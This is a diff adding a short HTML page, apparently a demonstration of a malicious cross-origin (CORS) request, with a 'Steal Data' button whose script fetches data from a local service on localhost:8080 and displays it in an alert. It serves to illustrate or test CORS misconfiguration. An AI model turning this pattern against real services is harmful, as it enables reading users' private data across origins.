@@ -1,0 +1,16 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Malicious CORS Request</title>
+</head>
+<body>
+<button onclick="fetchData()">Steal Data</button>
+<script>
+    async function fetchData() {
+        const response = await fetch("http://localhost:8080/data");
+        const data = await response.text();
+        alert(data);
+    }
+</script>
+</body>
+</html>
